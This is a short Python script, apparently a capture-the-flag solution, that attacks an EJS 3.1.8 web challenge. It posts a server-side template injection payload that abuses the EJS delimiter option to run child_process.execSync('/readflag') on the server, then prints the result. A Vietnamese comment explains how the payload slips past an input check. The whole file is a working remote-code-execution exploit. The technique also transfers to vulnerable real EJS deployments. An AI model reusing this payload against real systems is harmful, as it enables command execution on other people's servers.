import requests

url = "http://ejs-3.1.8-7548cb2a.dailycookie.cloud"

# cho thêm {{ name }} vì trong code có check xem template nhập vào có chứa chuỗi đó không
tmpl = """[.= global.process.mainModule.require('child_process').execSync('/readflag') .]{{ name }} """


data = {
    "tmpl": tmpl,
    "name": "5h4s1"
}
res = requests.post(url + "/template" , data=data, allow_redirects=False)

redirect = res.headers['location']

res = requests.get(url + redirect + "&delimiter=.")

print(res.text)